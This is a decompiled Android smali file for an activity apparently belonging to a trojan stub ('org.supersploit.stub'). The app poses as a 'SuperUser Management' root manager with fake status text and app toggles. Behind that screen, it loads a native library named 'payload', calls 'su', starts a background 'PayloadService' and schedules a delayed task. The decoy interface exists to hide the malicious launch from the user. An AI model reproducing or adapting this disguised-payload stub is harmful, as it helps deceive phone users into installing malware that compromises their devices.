.class public Lorg/supersploit/stub/RootManagerActivity;
.super Landroid/app/Activity;
.source "RootManagerActivity.java"


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 17
    const-string v0, "payload"

    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V

    .line 18
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 15
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 16

    .line 22
    move-object/from16 v1, p0

    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 26
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const-string v2, "su"

    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 27
    :catch_0
    move-exception v0

    :goto_0
    nop

    .line 29
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lorg/supersploit/stub/PayloadService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 30
    invoke-virtual {v1, v0}, Lorg/supersploit/stub/RootManagerActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 33
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v2, Lorg/supersploit/stub/RootManagerActivity$1;

    invoke-direct {v2, v1}, Lorg/supersploit/stub/RootManagerActivity$1;-><init>(Lorg/supersploit/stub/RootManagerActivity;)V

    const-wide/16 v3, 0x3a98

    invoke-virtual {v0, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 44
    new-instance v0, Landroid/widget/LinearLayout;

    invoke-direct {v0, v1}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 45
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 46
    const-string v3, "#EEEEEE"

    invoke-static {v3}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v0, v3}, Landroid/widget/LinearLayout;->setBackgroundColor(I)V

    .line 48
    new-instance v3, Landroid/widget/TextView;

    invoke-direct {v3, v1}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 49
    const-string v4, "SuperUser Management"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 50
    const/high16 v4, 0x41a00000    # 20.0f

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setTextSize(F)V

    .line 51
    const/4 v4, -0x1

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setTextColor(I)V

    .line 52
    const-string v5, "#3F51B5"

    invoke-static {v5}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v5

    invoke-virtual {v3, v5}, Landroid/widget/TextView;->setBackgroundColor(I)V

    .line 53
    const/4 v5, 0x0

    invoke-virtual {v3, v5, v2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 54
    const/16 v6, 0x28

    invoke-virtual {v3, v6, v6, v6, v6}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 55
    invoke-virtual {v0, v3}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 57
    new-instance v3, Landroid/widget/ScrollView;

    invoke-direct {v3, v1}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    .line 58
    new-instance v7, Landroid/widget/LinearLayout;

    invoke-direct {v7, v1}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 59
    invoke-virtual {v7, v2}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 60
    const/16 v8, 0x14

    invoke-virtual {v7, v8, v8, v8, v8}, Landroid/widget/LinearLayout;->setPadding(IIII)V

    .line 62
    new-instance v9, Landroid/widget/TextView;

    invoke-direct {v9, v1}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 63
    const-string v10, "Root Status: Granted\nSU Binary: v2.82\nSELinux: Enforcing\nActive Apps: 4"

    invoke-virtual {v9, v10}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 64
    const/high16 v10, 0x41800000    # 16.0f

    invoke-virtual {v9, v10}, Landroid/widget/TextView;->setTextSize(F)V

    .line 65
    const-string v10, "#4CAF50"

    invoke-static {v10}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v10

    invoke-virtual {v9, v10}, Landroid/widget/TextView;->setTextColor(I)V

    .line 66
    invoke-virtual {v9, v8, v8, v8, v6}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 67
    invoke-virtual {v9, v5, v2}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 68
    invoke-virtual {v7, v9}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 70
    const/4 v5, 0x4

    new-array v6, v5, [Ljava/lang/String;

    const-string v9, "Terminal Emulator"

    const/4 v10, 0x0

    aput-object v9, v6, v10

    const-string v9, "Titanium Backup"

    aput-object v9, v6, v2

    const-string v9, "Root Explorer"

    const/4 v11, 0x2

    aput-object v9, v6, v11

    const-string v9, "AdAway"

    const/4 v12, 0x3

    aput-object v9, v6, v12

    .line 71
    const/4 v9, 0x0

    :goto_1
    if-ge v9, v5, :cond_0

    aget-object v12, v6, v9

    .line 72
    new-instance v13, Landroid/widget/LinearLayout;

    invoke-direct {v13, v1}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 73
    invoke-virtual {v13, v10}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 74
    const/16 v14, 0x1e

    invoke-virtual {v13, v8, v14, v8, v14}, Landroid/widget/LinearLayout;->setPadding(IIII)V

    .line 75
    invoke-virtual {v13, v4}, Landroid/widget/LinearLayout;->setBackgroundColor(I)V

    .line 77
    new-instance v14, Landroid/widget/TextView;

    invoke-direct {v14, v1}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 78
    invoke-virtual {v14, v12}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 79
    const/high16 v12, 0x41900000    # 18.0f

    invoke-virtual {v14, v12}, Landroid/widget/TextView;->setTextSize(F)V

    .line 80
    const/high16 v12, -0x1000000

    invoke-virtual {v14, v12}, Landroid/widget/TextView;->setTextColor(I)V

    .line 81
    new-instance v12, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v15, -0x2

    const/high16 v5, 0x3f800000    # 1.0f

    invoke-direct {v12, v10, v15, v5}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v14, v12}, Landroid/widget/TextView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 83
    new-instance v5, Landroid/widget/Switch;

    invoke-direct {v5, v1}, Landroid/widget/Switch;-><init>(Landroid/content/Context;)V

    .line 84
    invoke-virtual {v5, v2}, Landroid/widget/Switch;->setChecked(Z)V

    .line 86
    invoke-virtual {v13, v14}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 87
    invoke-virtual {v13, v5}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 88
    invoke-virtual {v7, v13}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 90
    new-instance v5, Landroid/view/View;

    invoke-direct {v5, v1}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 91
    const-string v12, "#DDDDDD"

    invoke-static {v12}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v12

    invoke-virtual {v5, v12}, Landroid/view/View;->setBackgroundColor(I)V

    .line 92
    new-instance v12, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v12, v4, v11}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v5, v12}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 93
    invoke-virtual {v7, v5}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 71
    add-int/lit8 v9, v9, 0x1

    const/4 v5, 0x4

    goto :goto_1

    .line 96
    :cond_0
    invoke-virtual {v3, v7}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 97
    invoke-virtual {v0, v3}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 98
    invoke-virtual {v1, v0}, Lorg/supersploit/stub/RootManagerActivity;->setContentView(Landroid/view/View;)V

    .line 99
    return-void
.end method
